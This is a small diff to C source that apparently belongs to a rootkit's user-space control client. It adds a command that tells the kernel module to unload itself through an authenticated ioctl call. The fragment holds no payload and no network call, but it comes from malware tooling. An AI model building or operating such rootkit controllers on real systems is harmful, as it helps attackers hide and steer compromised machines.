@@ -255,6 +255,12 @@ int main ( int argc, char *argv[] )
             io = ioctl(sockfd, AUTH_TOKEN, &rk_args);
             break;
 
+        case 20:
+            printf("Killing Module\n");
+            rk_args.cmd = 20;
+            io = ioctl(sockfd, AUTH_TOKEN, &rk_args);
+            break;
+
         case 100:
             {
                 printf("Null command\n");
